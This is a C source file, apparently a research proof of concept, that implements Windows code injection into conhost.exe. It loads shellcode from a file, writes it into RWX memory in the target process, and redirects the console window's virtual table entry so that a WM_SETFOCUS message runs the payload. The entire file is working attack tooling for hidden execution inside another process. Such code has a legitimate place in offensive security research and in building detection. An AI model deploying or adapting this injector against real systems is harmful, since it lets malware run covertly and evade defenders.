
/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define UNICODE
  
#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

typedef struct _vftable_t {
    ULONG_PTR     EnableBothScrollBars;
    ULONG_PTR     UpdateScrollBar;
    ULONG_PTR     IsInFullscreen;
    ULONG_PTR     SetIsFullscreen;
    ULONG_PTR     SetViewportOrigin;
    ULONG_PTR     SetWindowHasMoved;
    ULONG_PTR     CaptureMouse;
    ULONG_PTR     ReleaseMouse;
    ULONG_PTR     GetWindowHandle;
    ULONG_PTR     SetOwner;
    ULONG_PTR     GetCursorPosition;
    ULONG_PTR     GetClientRectangle;
    ULONG_PTR     MapPoints;
    ULONG_PTR     ConvertScreenToClient;
    ULONG_PTR     SendNotifyBeep;
    ULONG_PTR     PostUpdateScrollBars;
    ULONG_PTR     PostUpdateTitleWithCopy;
    ULONG_PTR     PostUpdateWindowSize;
    ULONG_PTR     UpdateWindowSize;
    ULONG_PTR     UpdateWindowText;
    ULONG_PTR     HorizontalScroll;
    ULONG_PTR     VerticalScroll;
    ULONG_PTR     SignalUia;
    ULONG_PTR     UiaSetTextAreaFocus;
    ULONG_PTR     GetWindowRect;
} ConsoleWindow;

// just here for reference. it's not used here.
typedef struct _userData_t {
    ULONG_PTR vTable;     // gets replaced with new table pointer
    ULONG_PTR pUnknown;   // some undefined memory pointer
    HWND      hWnd;
    BYTE      buf[100];   // don't care
} UserData;

// given a process id for a console process, it will return 
// the process id for conhost.exe
DWORD conhostId(DWORD dwPPid) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        // conhost?
        if (lstrcmpi(L"conhost.exe", pe32.szExeFile)==0) {
          // child process?
          if (pe32.th32ParentProcessID == dwPPid) {
            // return process id
            dwPid = pe32.th32ProcessID;
            break;
          }
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    
    return dwPid;
}

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len, rd=0;
    
    // 1. open the file
    hf = CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if (hf != INVALID_HANDLE_VALUE){
      // get file size
      len = GetFileSize(hf, 0);
      // allocate memory
      *pic = malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID conhostInject(LPVOID payload, DWORD payloadSize) {
    HWND          hwnd;
    DWORD64       udptr;
    DWORD         pid, ppid;
    SIZE_T        wr;
    HANDLE        hp;
    ConsoleWindow cw;
    LPVOID        cs, ds;
    ULONG_PTR     vTable;
    
    // 1. Obtain handle and process id for a console window 
    //   (this assumes one already running)
    hwnd = FindWindow(L"ConsoleWindowClass", NULL);
    
    GetWindowThreadProcessId(hwnd, &ppid);

    // 2. Obtain the process id for the host process 
    pid = conhostId(ppid);
    
    // csrss.exe spawns conhost.exe on 32-bit windows 
    if (pid==0) {
      printf("parent id is %ld\nunable to obtain pid of conhost.exe\n", ppid);
      return;
    }
    // 3. Open the conhost.exe process
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // 4. Allocate RWX memory and copy the payload there
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 5. Read the address of current virtual table
    udptr = (DWORD64)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    
    printf("GWLP_USERDATA : %llx\n", udptr);
    
    ReadProcessMemory(hp, (LPVOID)udptr, 
        (LPVOID)&vTable, sizeof(ULONG_PTR), &wr);
    
    printf("Table         : %p\n", vTable);
    
    // 6. Read the current virtual table into local memory
    ReadProcessMemory(hp, (LPVOID)vTable, 
      (LPVOID)&cw, sizeof(ConsoleWindow), &wr);
      
    // 7. Allocate RW memory for the new virtual table
    ds = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow), 
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // 8. update the local copy of virtual table with 
    //    address of payload and write to remote process
    cw.GetWindowHandle = (ULONG_PTR)cs;
    WriteProcessMemory(hp, ds, &cw, sizeof(ConsoleWindow), &wr); 

    // 9. Update pointer to virtual table in remote process
    WriteProcessMemory(hp, (LPVOID)udptr, &ds, 
      sizeof(ULONG_PTR), &wr); 
      
    printf("Set breakpoint on %p\nWindow Handle : %p", 
      (PVOID)cs, (PVOID)hwnd
      );
    getchar();
    
    // 10. Trigger execution of the payload
    SendMessage(hwnd, WM_SETFOCUS, 0, 0);

    // 11. Restore pointer to original virtual table
    WriteProcessMemory(hp, (LPVOID)udptr, &vTable, 
      sizeof(ULONG_PTR), &wr);
    
    // 12. Release memory and close handles
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    
    CloseHandle(hp);
}

int main(void) {
    PWCHAR   *argv;
    int      argc;
    LPVOID   payload;
    DWORD    payloadSize;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if(argc != 2) { wprintf(L"usage: chost <payload>\n"); return 0; }

    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { wprintf(L"unable to read from %s\n", argv[1]); return 0; }
    
    conhostInject(payload, payloadSize);
    return 0;
}
